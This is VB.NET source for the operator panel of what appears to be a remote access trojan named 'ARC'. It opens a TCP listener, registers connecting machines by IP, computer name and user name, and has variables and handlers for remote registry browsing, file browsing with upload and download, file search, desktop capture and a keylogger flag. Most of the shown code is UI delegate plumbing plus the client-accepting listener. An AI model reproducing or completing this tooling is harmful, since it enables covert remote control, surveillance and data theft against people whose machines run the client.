
Imports Microsoft.VisualBasic
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Drawing
Imports System.Text
Imports System.Windows.Forms
Imports System.Net.Sockets
Imports System.IO
Imports System.Threading
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Drawing.Imaging
Imports System.Drawing.Drawing2D
Imports System.Security.Cryptography
Imports System.Diagnostics
Imports System.Reflection
Imports Microsoft.Win32


Partial Public Class Frm
    Inherits Form

#Region "Vars..."
    'Dim currentUserNode As New TreeNode(Registry.ClassesRoot.Name, 0, 1)
    ' Dim currentUserNode2 As New TreeNode(Registry.CurrentConfig.Name, 0, 1)
    Private currentUserNode3 As New TreeNode(Registry.CurrentUser.Name, 0, 1)
    Private currentUserNode4 As New TreeNode(Registry.LocalMachine.Name, 0, 1)
    Private currentUserNode5 As New TreeNode(Registry.Users.Name, 0, 1)
    Private objListViewItem, objListViewItem1, objListViewItem2, objListViewItem3 As ListViewItem
    Private itimer, itimer2 As Integer
    Private Connect As Integer
    Private klflag, updateflag, gflag As Boolean
    Private tcpListener As TcpListener
    Private socketForServer As Socket
    Private networkStream As List(Of NetworkStream) = New List(Of NetworkStream)()
    Private streamWriterlist As List(Of StreamWriter) = New List(Of StreamWriter)()
    Private streamReaderlist As List(Of StreamReader) = New List(Of StreamReader)()
    Private lastparts As List(Of String) = New List(Of String)
    Private strInput As StringBuilder
    Private th_StartListen, th_RunClient As Thread
    Private clientList As List(Of Socket) = New List(Of Socket)()
    Private canStopListening As Boolean = False
    Private ipe As String
    Private i As Integer = 0
    Private PercorsoAssoluto As String
    Private NoTemp As String
    Private FlagDown As Boolean
    Private FlagUpld As Boolean
    Private FlagDesk As Boolean
    Private FileSize As Integer
    Private _InputFileStram As System.IO.FileStream
    Private _OutputFileStram As System.IO.FileStream
    Private _BinaryWriter As BinaryWriter
    Private _BinaryReader As BinaryReader
    Private _MergeFiles() As String
    Private _index As Short
    Private _buffer() As Byte = New Byte() {}
    Private _FileSize As Long
    Private _MergedFile As String
    Private _MergingFileName As String
    Private _Error As String
    Private _OutPutPath As String
    Private ChunkSize As Integer = 4096
    Private _Fragments As Integer
    Private _RemainingBytes As Long
    Private _StartPosition As Long
    Private strupload As String
    Private visparts As String()
    Private procparts As String()
    Private returnImage As Image
    Private flag, flag1, flag2, flag3 As Boolean
    Private listnew As New ListBox
    Private clcursorx, clcursory As Integer
    Private Quality As String = "Good Quality"

#End Region

#Region "Func..."

    Private Sub frmDrag_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles MyBase.Paint
        Try
            Dim p As New Pen(Color.CadetBlue, 3)
            e.Graphics.DrawRectangle(p, 0, 0, Me.Width - 1, Me.Height - 1)
            p.Dispose()
        Catch ex As Exception

        End Try

    End Sub

    Private lastClick As Point

    Private Sub frmDrag_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseDown
        lastClick = New Point(e.X, e.Y)
    End Sub

    Private Sub frmDrag_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MyBase.MouseMove
        If e.Button = MouseButtons.Left Then
            Me.Left += e.X - lastClick.X
            Me.Top += e.Y - lastClick.Y
        End If
    End Sub

    Private Sub MenuStrip1_MouseDoubleClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles MenuStrip1.MouseDoubleClick
        If Me.WindowState = FormWindowState.Normal Then
            Me.WindowState = FormWindowState.Maximized
            Button81.Text = "]["
        ElseIf WindowState = FormWindowState.Maximized Then
            Me.WindowState = FormWindowState.Normal
            Button81.Text = "[]"
        End If

    End Sub

    Private Sub label1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MenuStrip1.MouseDown
        frmDrag_MouseDown(sender, e)
    End Sub

    Private Sub label1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles MenuStrip1.MouseMove
        frmDrag_MouseMove(sender, e)
    End Sub
    Private Sub Delay(ByVal DelayInSeconds As Integer)
        Dim ts As TimeSpan
        Dim targetTime As DateTime = DateTime.Now.AddSeconds(DelayInSeconds)
        Do
            ts = targetTime.Subtract(DateTime.Now)
            Application.DoEvents()
            System.Threading.Thread.Sleep(100)
        Loop While ts.TotalSeconds > 0
    End Sub

    Public Sub New()
        InitializeComponent()
    End Sub


    Private Function FileSize_(ByVal FileName As String) As Long
        Dim _fileInfo As System.IO.FileInfo
        _fileInfo = New FileInfo(FileName)
        Return _fileInfo.Length
        _fileInfo = Nothing
    End Function

#End Region

#Region "Writeto..."
    Private Delegate Sub addtree(ByVal item As String)
    Private Delegate Sub addtree2(ByVal item As TreeNode)

    Private Sub WriteTotree2(ByVal item As TreeNode)
        If Me.TreeView2.InvokeRequired Then
            Dim del As New addtree2(AddressOf Me.WriteTotree2)

            Me.TreeView2.Invoke(del, New Object() {item})

        Else
            If item Is Nothing Then
                TreeView2.Nodes.Clear()
            Else
                TreeView2.Nodes.Add(item)
            End If


        End If
    End Sub

    Private Sub WriteToSub(ByVal item As String)
        If Me.TreeView2.InvokeRequired Then
            Dim del As New addtree(AddressOf Me.WriteToSub)

            Me.TreeView2.Invoke(del, New Object() {item})

        Else

            nodf.Nodes.Add(item)



        End If
    End Sub



    Private Sub WriteToValue(ByVal item As String)
        If Me.TreeView2.InvokeRequired Then
            Dim del As New addtree(AddressOf Me.WriteToValue)

            Me.TreeView2.Invoke(del, New Object() {item})

        Else
            Dim parts As String() = item.Split("§")
            If parts(0) IsNot Nothing Then
                'Display the data of the value. The conditional operatore is
                'needed because the default value has no name
                nodf.Nodes.Add(parts(0), (If(parts(0) = "", "Default", parts(0))) & ": " & parts(1), 2, 2)
            Else
                'Display <empty> if the value is empty
                nodf.Nodes.Add(parts(0), (If(parts(0) = "", "Default", parts(0))) & ": <empty>", 2, 2)
            End If


        End If
    End Sub
    Private Sub WriteTotreeclear()
        If Me.TreeView2.InvokeRequired Then
            Dim del As New addtree2(AddressOf Me.WriteTotree2)

            Me.TreeView2.Invoke(del, New Object() {})

        Else

            TreeView2.Nodes.Clear()



        End If
    End Sub


    Private Delegate Sub addvalueDelegate(ByVal item As Integer)

    Private Sub WriteToPB(ByVal item As Integer)
        If Me.ProgressBar1.InvokeRequired Then
            Dim del As New addvalueDelegate(AddressOf Me.WriteToPB)

            Me.ProgressBar1.Invoke(del, New Object() {item})

        Else
            If item = 0 Then
                Me.ProgressBar1.Value = item
            Else
                Me.ProgressBar1.Value = Me.ProgressBar1.Value + item
            End If

        End If
    End Sub
    Private Sub WriteToPB2(ByVal item As Integer)
        If Me.ProgressBar3.InvokeRequired Then
            Dim del As New addvalueDelegate(AddressOf Me.WriteToPB2)

            Me.ProgressBar3.Invoke(del, New Object() {item})

        Else
            If item = 0 Then
                Me.ProgressBar3.Value = item
            Else
                Me.ProgressBar3.Value = Me.ProgressBar3.Value + item
            End If

        End If
    End Sub

    Private Delegate Sub addvaluepb4()
    Private Sub WriteToPB4()
        If Me.ProgressBar4.InvokeRequired Then
            Dim del As New addvaluepb4(AddressOf Me.WriteToPB4)

            Me.ProgressBar4.Invoke(del, New Object() {})

        Else

            Me.ProgressBar4.Style = ProgressBarStyle.Blocks
            Me.ProgressBar4.MarqueeAnimationSpeed = 0
            Me.ProgressBar4.Value = 0
        End If


    End Sub



    Private Sub WriteToPBMax(ByVal item As Integer)
        If Me.ProgressBar1.InvokeRequired Then
            Dim del As New addvalueDelegate(AddressOf Me.WriteToPBMax)

            Me.ProgressBar1.Invoke(del, New Object() {item})

        Else
            Me.ProgressBar1.Maximum = item
        End If
    End Sub

    Private Sub WriteToPBMax2(ByVal item As Integer)
        If Me.ProgressBar3.InvokeRequired Then
            Dim del As New addvalueDelegate(AddressOf Me.WriteToPBMax2)

            Me.ProgressBar3.Invoke(del, New Object() {item})

        Else
            Me.ProgressBar3.Maximum = item
        End If
    End Sub

    Private Delegate Sub addimageDelegate(ByVal item As Image)
    Private Sub WriteToPictureBox(ByVal item As Image)
        If Me.PictureBox2.InvokeRequired Then
            Dim del As New addimageDelegate(AddressOf Me.WriteToPictureBox)

            Me.PictureBox2.Invoke(del, New Object() {item})

        Else
            Me.PictureBox2.Image = item
        End If
    End Sub

    Private Sub WriteToPictureBox3(ByVal item As Image)
        If Me.PictureBox3.InvokeRequired Then
            Dim del As New addimageDelegate(AddressOf Me.WriteToPictureBox3)

            Me.PictureBox3.Invoke(del, New Object() {item})

        Else
            Me.PictureBox3.Image = item
        End If
    End Sub

    Private Delegate Sub addtextDelegate(ByVal item As String)

    Private Sub WriteTotextBox5(ByVal item As String)
        If Me.TextBox5.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTotextBox5)

            Me.TextBox5.Invoke(del, New Object() {item})

        Else
            Me.TextBox5.Text = item
        End If
    End Sub

    Private Sub WriteTotextBox6(ByVal item As String)
        If Me.TextBox6.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTotextBox6)

            Me.TextBox6.Invoke(del, New Object() {item})

        Else
            Me.TextBox6.Text = item
        End If
    End Sub

    Private Sub WriteTotextBox15(ByVal item As String)
        If Me.TextBox15.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTotextBox15)

            Me.TextBox15.Invoke(del, New Object() {item})

        Else
            Me.TextBox15.Text = item
        End If
    End Sub
    Private Delegate Sub addtextDelegate27(ByVal item As String)
    Private Sub WriteTotextBox27(ByVal item As String)
        If Me.TextBox27.InvokeRequired Then
            Dim del As New addtextDelegate27(AddressOf Me.WriteTotextBox27)

            Me.TextBox27.Invoke(del, New Object() {item})

        Else
            Me.TextBox27.Text = item
        End If
    End Sub

    Private Sub WriteTobutton45(ByVal item As String)
        If Me.Button45.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTobutton45)

            Me.Button45.Invoke(del, New Object() {item})

        Else
            Dim myFont As System.Drawing.Font
            myFont = New System.Drawing.Font("Microsoft Sans Serif", 8, FontStyle.Regular)
            Button45.Font = myFont
            FlagUpld = False
            Me.Button45.Text = item
        End If
    End Sub

    Private Sub WriteTobutton64(ByVal item As String)
        If Me.Button64.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTobutton64)

            Me.Button64.Invoke(del, New Object() {item})

        Else
            FlagDown = False
            Me.Button64.Text = item
        End If
    End Sub

    Private Delegate Sub addtextDelegate76()
    Private Sub WriteTobutton76()
        If Me.Button76.InvokeRequired Then
            Dim del As New addtextDelegate76(AddressOf Me.WriteTobutton76)

            Me.Button76.Invoke(del, New Object() {})

        Else
            FlagDown = False
            Me.Button76.Text = "Search"
        End If
    End Sub

    Private Sub WriteTobutton86(ByVal item As String)
        If Me.Button86.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTobutton86)

            Me.Button86.Invoke(del, New Object() {item})

        Else
            FlagDown = False
            Me.Button86.Text = item
        End If
    End Sub

    Private Sub WriteTotextBox10(ByVal item As String)
        If Me.TextBox10.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTotextBox10)

            Me.TextBox10.Invoke(del, New Object() {item})

        Else
            Me.TextBox10.Text = item
        End If
    End Sub

    Private Sub WriteTotextBox13(ByVal item As String)
        If Me.TextBox13.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteTotextBox13)

            Me.TextBox13.Invoke(del, New Object() {item})

        Else
            Me.TextBox13.Text = Me.TextBox13.Text & item
        End If
    End Sub

    Private Sub WriteToCombo1(ByVal item As String)
        If Me.ComboBox1.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteToCombo1)

            Me.ComboBox1.Invoke(del, New Object() {item})

        Else
            Me.ComboBox1.Items.Add(item)
        End If
    End Sub

    Private Sub WriteToCombo3(ByVal item As String)
        If Me.ComboBox3.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteToCombo3)

            Me.ComboBox3.Invoke(del, New Object() {item})

        Else
            Me.ComboBox3.Items.Add(item)
        End If
    End Sub


    Private Sub WriteToCombo4(ByVal item As String)
        If Me.ComboBox4.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteToCombo4)

            Me.ComboBox4.Invoke(del, New Object() {item})

        Else
            Me.ComboBox4.Items.Add(item)
        End If
    End Sub


    Private Sub WriteToList4(ByVal item As String)
        If Me.ListView4.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteToList4)
            Me.ListView4.Invoke(del, New Object() {item})
        Else
            If item = Nothing Then
            Else
                If item.EndsWith(".mdb") Or item.EndsWith(".mdb".ToUpper) Then
                    Me.ListView4.Items.Add(item, 0)
                ElseIf item.EndsWith(".dll") Or item.EndsWith(".dll".ToUpper) Then
                    Me.ListView4.Items.Add(item, 12)
                ElseIf item.EndsWith(".exe") Or item.EndsWith(".exe".ToUpper) Then
                    Me.ListView4.Items.Add(item, 16)
                ElseIf item.EndsWith(".jpg") Or item.EndsWith(".png") Or item.EndsWith(".bmp") Or item.EndsWith(".gif") Or item.EndsWith(".ico") _
                Or item.EndsWith(".jpg".ToUpper) Or item.EndsWith(".png".ToUpper) Or item.EndsWith(".bmp".ToUpper) Or item.EndsWith(".gif".ToUpper) Or item.EndsWith(".ico".ToUpper) Then
                    Me.ListView4.Items.Add(item, 8)
                ElseIf item = "(DIR)." Or item = "(DIR).." Then
                    Me.ListView4.Items.Add(item)
                ElseIf item.StartsWith("(DIR)") Then
                    Me.ListView4.Items.Add(item, 1)
                ElseIf item.EndsWith(".doc") Or item.EndsWith(".doc".ToUpper) Then
                    Me.ListView4.Items.Add(item, 5)
                ElseIf item.EndsWith(".xls") Or item.EndsWith(".xls".ToUpper) Then
                    Me.ListView4.Items.Add(item, 6)
                ElseIf item.EndsWith(".ppt") Or item.EndsWith(".ppt".ToUpper) Then
                    Me.ListView4.Items.Add(item, 7)
                ElseIf item.EndsWith(".rar") Or item.EndsWith(".rar".ToUpper) Then
                    Me.ListView4.Items.Add(item, 9)
                ElseIf item.EndsWith(".bat") Or item.EndsWith(".bat".ToUpper) Then
                    Me.ListView4.Items.Add(item, 2)
                ElseIf item.EndsWith(".wmv") Or item.EndsWith(".avi") Or item.EndsWith(".mpg") Or item.EndsWith(".mpeg") _
                Or item.EndsWith(".wmv".ToUpper) Or item.EndsWith(".avi".ToUpper) Or item.EndsWith(".mpg".ToUpper) Or item.EndsWith(".mpeg".ToUpper) Then
                    Me.ListView4.Items.Add(item, 4)
                ElseIf item.EndsWith(".zip") Or item.EndsWith(".zip".ToUpper) Then
                    Me.ListView4.Items.Add(item, 11)
                ElseIf item.EndsWith(".url") Or item.EndsWith(".url".ToUpper) Or item.EndsWith(".htm") Or item.EndsWith(".htm".ToUpper) Or item.EndsWith(".html") Or item.EndsWith(".html".ToUpper) Then
                    Me.ListView4.Items.Add(item, 3)
                ElseIf item.EndsWith(".txt") Or item.EndsWith(".txt".ToUpper) Or item.EndsWith(".log") Or item.EndsWith(".log".ToUpper) Or item.EndsWith(".ini") Or item.EndsWith(".ini".ToUpper) Or item.EndsWith(".inf") Or item.EndsWith(".inf".ToUpper) Then
                    Me.ListView4.Items.Add(item, 14)
                ElseIf item.EndsWith(".pdf") Or item.EndsWith(".pdf".ToUpper) Then
                    Me.ListView4.Items.Add(item, 15)
                Else
                    Me.ListView4.Items.Add(item, 13)

                End If
            End If


        End If
    End Sub

    Private Delegate Sub addlistDelegate(ByVal item As String, ByVal item2 As String, ByVal item3 As String, ByVal item4 As String, ByVal item5 As String)
    Private Delegate Sub addlistDelegate2(ByVal item As String, ByVal item2 As String, ByVal item3 As String, ByVal item4 As String)
    Private Delegate Sub addlistDelegate3(ByVal item As String, ByVal item2 As String, ByVal item3 As String)

    Private Sub WriteTolistview1(ByVal item As String, ByVal item2 As String, ByVal item3 As String, ByVal item4 As String, ByVal item5 As String)
        If Me.ListView1.InvokeRequired Then
            Dim del As New addlistDelegate(AddressOf Me.WriteTolistview1)

            Me.ListView1.Invoke(del, New Object() {item, item2, item3, item4, item5})

        Else
            ListView1.Items.Add(item)
            ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(item2)
            ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(item3)
            ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(item4)
            ListView1.Items(ListView1.Items.Count - 1).SubItems.Add(item5)
        End If
    End Sub

    Private Delegate Sub addlist5Delegate(ByVal item As String)

    Private Sub WriteTolistview5(ByVal item As String)
        If Me.ListView5.InvokeRequired Then
            Dim del As New addlist5Delegate(AddressOf Me.WriteTolistview5)
            Me.ListView5.Invoke(del, New Object() {item})
        Else
            If item = "SEARCHEND" Then
                WriteToPB4()
            Else
                If item = Nothing Then
                Else
                    Dim parts2() As String = Nothing
                    Dim parts() As String = Nothing
                    parts2 = item.Split("¦")
                    parts = parts2(0).Split("\")
                    Dim sizes As Double = Int32.Parse(parts2(1)) \ 1024
                    Dim size As String = sizes & "Kb"
                    Dim items As String = parts(parts.Length - 1)
                    If items.EndsWith(".mdb") Or items.EndsWith(".mdb".ToUpper) Then
                        Me.ListView5.Items.Add(items, 0)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".dll") Or items.EndsWith(".dll".ToUpper) Then
                        Me.ListView5.Items.Add(items, 12)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".exe") Or items.EndsWith(".exe".ToUpper) Then
                        Me.ListView5.Items.Add(items, 16)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".jpg") Or items.EndsWith(".png") Or items.EndsWith(".bmp") Or items.EndsWith(".gif") Or items.EndsWith(".ico") _
                    Or items.EndsWith(".jpg".ToUpper) Or items.EndsWith(".png".ToUpper) Or items.EndsWith(".bmp".ToUpper) Or items.EndsWith(".gif".ToUpper) Or items.EndsWith(".ico".ToUpper) Then
                        Me.ListView5.Items.Add(items, 8)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items = "(DIR)." Or items = "(DIR).." Then
                        Me.ListView5.Items.Add(items)
                    ElseIf items.StartsWith("(DIR)") Then
                        Me.ListView5.Items.Add(items, 1)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".doc") Or items.EndsWith(".doc".ToUpper) Then
                        Me.ListView5.Items.Add(items, 5)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".xls") Or items.EndsWith(".xls".ToUpper) Then
                        Me.ListView5.Items.Add(items, 6)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".ppt") Or items.EndsWith(".ppt".ToUpper) Then
                        Me.ListView5.Items.Add(items, 7)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".rar") Or items.EndsWith(".rar".ToUpper) Then
                        Me.ListView5.Items.Add(items, 9)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".bat") Or items.EndsWith(".bat".ToUpper) Then
                        Me.ListView5.Items.Add(items, 2)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".wmv") Or items.EndsWith(".avi") Or items.EndsWith(".mpg") Or items.EndsWith(".mpeg") _
                    Or items.EndsWith(".wmv".ToUpper) Or items.EndsWith(".avi".ToUpper) Or items.EndsWith(".mpg".ToUpper) Or items.EndsWith(".mpeg".ToUpper) Then
                        Me.ListView5.Items.Add(items, 4)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".zip") Or items.EndsWith(".zip".ToUpper) Then
                        Me.ListView5.Items.Add(items, 11)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".url") Or items.EndsWith(".url".ToUpper) Or item.EndsWith(".htm") Or item.EndsWith(".htm".ToUpper) Or item.EndsWith(".html") Or item.EndsWith(".html".ToUpper) Then
                        Me.ListView5.Items.Add(items, 3)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".txt") Or items.EndsWith(".txt".ToUpper) Or items.EndsWith(".log") Or items.EndsWith(".log".ToUpper) Or items.EndsWith(".ini") Or items.EndsWith(".ini".ToUpper) Or items.EndsWith(".inf") Or items.EndsWith(".inf".ToUpper) Then
                        Me.ListView5.Items.Add(items, 14)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    ElseIf items.EndsWith(".pdf") Or items.EndsWith(".pdf".ToUpper) Then
                        Me.ListView5.Items.Add(items, 15)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))
                    Else
                        Me.ListView5.Items.Add(items, 13)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(size)
                        Me.ListView5.Items(ListView5.Items.Count - 1).SubItems.Add(parts2(0))

                    End If
                End If
            End If

        End If
    End Sub

    Private Sub WriteTolistview2(ByVal item As String, ByVal item2 As String, ByVal item3 As String, ByVal item4 As String)
        If Me.ListView2.InvokeRequired Then
            Dim del As New addlistDelegate2(AddressOf Me.WriteTolistview2)

            Me.ListView2.Invoke(del, New Object() {item, item2, item3, item4})

        Else
            ListView2.Items.Add(item)
            ListView2.Items(ListView2.Items.Count - 1).SubItems.Add(item2)
            ListView2.Items(ListView2.Items.Count - 1).SubItems.Add(item3)
            ListView2.Items(ListView2.Items.Count - 1).SubItems.Add(item4)
        End If
    End Sub

    Private Sub WriteTolistview3(ByVal item As String, ByVal item2 As String, ByVal item3 As String)
        If Me.ListView3.InvokeRequired Then
            Dim del As New addlistDelegate3(AddressOf Me.WriteTolistview3)

            Me.ListView3.Invoke(del, New Object() {item, item2, item3})

        Else
            ListView3.Items.Add(item)
            ListView3.Items(ListView3.Items.Count - 1).SubItems.Add(item2)
            ListView3.Items(ListView3.Items.Count - 1).SubItems.Add(item3)

        End If
    End Sub

    Private Delegate Sub clearcomboDelegate()

    Private Sub ClearCombo1()
        If Me.ComboBox1.InvokeRequired Then
            Dim del As New clearcomboDelegate(AddressOf Me.ClearCombo1)

            Me.ComboBox1.Invoke(del, New Object() {})

        Else
            Me.ComboBox1.Items.Clear()
        End If
    End Sub

   

    Private Sub ClearCombo3()
        If Me.ComboBox3.InvokeRequired Then
            Dim del As New clearcomboDelegate(AddressOf Me.ClearCombo3)

            Me.ComboBox3.Invoke(del, New Object() {})

        Else
            Me.ComboBox3.Items.Clear()
        End If
    End Sub

    Private Sub ClearCombo4()
        If Me.ComboBox4.InvokeRequired Then
            Dim del As New clearcomboDelegate(AddressOf Me.ClearCombo4)

            Me.ComboBox4.Invoke(del, New Object() {})

        Else
            Me.ComboBox4.Items.Clear()
        End If
    End Sub

   

    Private Delegate Sub clearlistDelegate()

    Private Sub Clearlist2()
        If Me.ListView2.InvokeRequired Then
            Dim del As New clearlistDelegate(AddressOf Me.Clearlist2)

            Me.ListView2.Invoke(del, New Object() {})

        Else
            Me.ListView2.Items.Clear()
        End If
    End Sub

    Private Sub WriteToList3(ByVal item As String)
        If Me.List3.InvokeRequired Then
            Dim del As New addtextDelegate(AddressOf Me.WriteToList3)

            Me.List3.Invoke(del, New Object() {item})

        Else
            Me.List3.Items.Add(item)
        End If
    End Sub

    Private Sub Clearlist3()
        If Me.List3.InvokeRequired Then
            Dim del As New clearlistDelegate(AddressOf Me.Clearlist3)

            Me.List3.Invoke(del, New Object() {})

        Else
            Me.List3.Items.Clear()
        End If
    End Sub

    Private Sub Clearlist4()
        If Me.ListView4.InvokeRequired Then
            Dim del As New clearlistDelegate(AddressOf Me.Clearlist4)

            Me.ListView4.Invoke(del, New Object() {})

        Else
            Me.ListView4.Items.Clear()
        End If
    End Sub

    Private Sub Clearlist5()
        If Me.ListView5.InvokeRequired Then
            Dim del As New clearlistDelegate(AddressOf Me.Clearlist5)

            Me.ListView5.Invoke(del, New Object() {})

        Else
            Me.ListView5.Items.Clear()
        End If
    End Sub


    Private Delegate Sub DisplayDelegate(ByVal message As String)

    Private Sub DisplayMessage(ByVal message As String)
        If textBox1.InvokeRequired Then
            Invoke(New DisplayDelegate(AddressOf DisplayMessage), New Object() {message})
        Else
            textBox1.AppendText(message)
        End If

    End Sub

#End Region

#Region "cmd..."
    Private processCmd As Process

    Private Sub cmdin()
        processCmd = New Process()
        processCmd.StartInfo.FileName = "cmd.exe"
        processCmd.StartInfo.CreateNoWindow = True
        processCmd.StartInfo.UseShellExecute = False
        processCmd.StartInfo.RedirectStandardOutput = True
        processCmd.StartInfo.RedirectStandardInput = True
        processCmd.StartInfo.RedirectStandardError = True
        AddHandler processCmd.OutputDataReceived, AddressOf CmdOutputDataHandler
        processCmd.Start()
        processCmd.BeginOutputReadLine()
        processCmd.StandardInput.WriteLine("netstat -o -a -n" & Constants.vbCrLf)
    End Sub

    Private Sub CmdOutputDataHandler(ByVal sendingProcess As Object, ByVal outLine As DataReceivedEventArgs)
        Try
            Dim strOutput As New StringBuilder()
            Dim stri As List(Of String) = New List(Of String)
            Dim str As String()
            If (Not String.IsNullOrEmpty(outLine.Data)) Then
                Try

                    str = outLine.Data.Split(" ")
                    For Each itm As String In str
                        If itm = "" Then
                        Else
                            stri.Add(itm)
                        End If
                    Next

                    If stri.Item(1).Contains(":" & TextBox18.Text) Then
                        Dim ps() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcesses()
                        Try
                            Dim pp As Process
                            For Each pp In ps
                                If pp.Id = stri.Item(4) Then
                                    Try
                                        MessageBox.Show(pp.ProcessName & ".exe is using port " & TextBox18.Text & "," & vbCrLf & "please close " & pp.ProcessName & ".exe" & " and restart the ARC!", "Port " & TextBox18.Text & " is used!!!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                        Application.Exit()
                                    Catch ex As Exception
                                        MessageBox.Show(pp.ProcessName & ".exe is using port " & TextBox18.Text & "," & vbCrLf & "please close " & pp.ProcessName & ".exe" & " and restart the ARC!", "Port " & TextBox18.Text & " is used!!!", MessageBoxButtons.OK, MessageBoxIcon.Information)
                                        Application.Exit()
                                    End Try
                                    Delay(2)
                                End If

                            Next pp
                        Catch ex As Exception

                        End Try
                    End If

                Catch err As Exception

                End Try

            End If
        Catch ex As Exception
        End Try

    End Sub
#End Region

#Region "Connect..."
    Private Sub StartListen()
        Dim portl As Integer = Int32.Parse(TextBox18.Text)
        Dim ipadrs As String = Nothing
        Dim compname As String = Nothing
        Dim username As String = Nothing
        Dim data As String = Nothing
        Try
            tcpListener = New TcpListener(New IPEndPoint(System.Net.IPAddress.Any, portl))
            tcpListener.Start()
            toolStripStatusLabel1.Text = "Listening on port " & TextBox18.Text & "..."

        Catch ex As Exception
            tcpListener.Stop()
            cmdin()
            Exit Sub
        End Try

        Do
            Try
                socketForServer = tcpListener.AcceptSocket()
                Dim t As Thread = New System.Threading.Thread(New ParameterizedThreadStart(AddressOf INF))
                t.Start(socketForServer)
                Threading.Thread.Sleep(100)
            Catch ex As Exception
            End Try

        Loop

    End Sub

    Private Sub INF(ByVal NStream As Object)
        Try
            Dim ns As NetworkStream
            Dim sw As StreamWriter
            Dim sr As StreamReader

            ns = New NetworkStream(NStream)
            sw = New StreamWriter(ns)
            sr = New StreamReader(ns)
            Dim ipend As IPEndPoint = CType(NStream.RemoteEndPoint, IPEndPoint)
            Dim ipadrs As String = ipend.Address.ToString
            sw.WriteLine("/FIRSTINF/")
            sw.Flush()
            Delay(1)
            Dim data As String = sr.ReadLine()
            If data = Nothing Then
            Else
                Dim parts As String() = data.Split(CChar("*"))
                Dim lastpart As String
                Try
                    If parts.Length < 4 Then
                        lastpart = "1.0"
                    Else
                        lastpart = parts.GetValue(3)
                    End If
            lastparts.Add(lastpart)
        Catch ex As Exception
            lastpart = "1.0"
            lastparts.Add(lastpart)
        End Try
                WriteTolistview1(ipadrs, parts.GetValue(0), parts.GetValue(1), parts.GetValue(2), lastpart)
                networkStream.Add(ns)
                clientList.Add(NStream)
                streamWriterlist.Add(sw)
                streamReaderlist.Add(sr)
                sw = Nothing
                sr = Nothing
                ns = Nothing
                parts = Nothing
                Connect = Connect + 1
                toolStripStatusLabel1.Text = "Connected Clients " & Connect
                Notify.Text = "Connected Clients " & Connect
            End If
        Catch ex As Exception

        End Try


    End Sub
#End Region

